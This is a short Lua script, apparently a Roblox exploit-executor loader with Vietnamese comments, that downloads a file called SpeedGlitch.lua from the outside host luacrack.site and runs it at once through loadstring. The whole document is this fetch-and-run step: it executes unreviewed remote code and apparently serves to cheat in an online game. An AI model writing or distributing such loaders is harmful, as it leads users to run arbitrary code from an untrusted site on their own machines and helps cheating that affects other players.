local url = "https://luacrack.site/index.php/AngryCat/raw/SpeedGlitch.lua"

local ok, err = pcall(function()
    local get = game.HttpGet or game.HttpGetAsync or game.GetService and game:GetService("HttpService").GetAsync
    -- đơn giản thường dùng:
    local body = game:HttpGet(url) -- nếu executor hỗ trợ
    local fn = loadstring or load
    fn(body)()
end)

if not ok then
    warn("Không thể tải / chạy script:", err)
end